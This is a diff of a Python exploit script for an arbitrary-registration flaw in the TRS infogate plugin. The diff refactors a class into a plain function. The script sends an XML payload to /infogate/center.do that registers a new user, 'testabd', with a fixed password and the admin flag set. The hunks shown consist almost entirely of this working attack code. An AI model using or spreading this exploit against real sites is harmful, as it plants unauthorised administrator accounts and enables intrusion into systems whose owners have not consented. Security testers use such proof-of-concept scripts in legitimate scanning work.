@@ -10,20 +10,13 @@ import sys
 import json
 import requests
 import warnings
-
-
-
-class infogate_register:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['trs infogate插件 任意注册漏洞','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payload = "/infogate/center.do"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         post_data = '''
             <post-data><method type="save">infogate_customer</method><parameters><CUSTOMERUSERID><![CDATA[0]]></CUSTOMERUSERID><USERSTATUS><![CDATA[1]]></USERSTATUS><USERNAME><![CDATA[testabd]]></USERNAME><EMAIL><![CDATA[1@1.1.1.1]]></EMAIL><PASSWORD><![CDATA[111111]]></PASSWORD><REALNAME><![CDATA[]]></REALNAME><NICKNAME><![CDATA[]]></NICKNAME><COMEFROM><![CDATA[]]></COMEFROM><TELEPHONE><![CDATA[]]></TELEPHONE><ISADMIN><![CDATA[1]]></ISADMIN><GROUPID><![CDATA[0]]></GROUPID></parameters></post-data>
         '''
@@ -41,5 +34,4 @@ class infogate_register:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = infogate_register(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
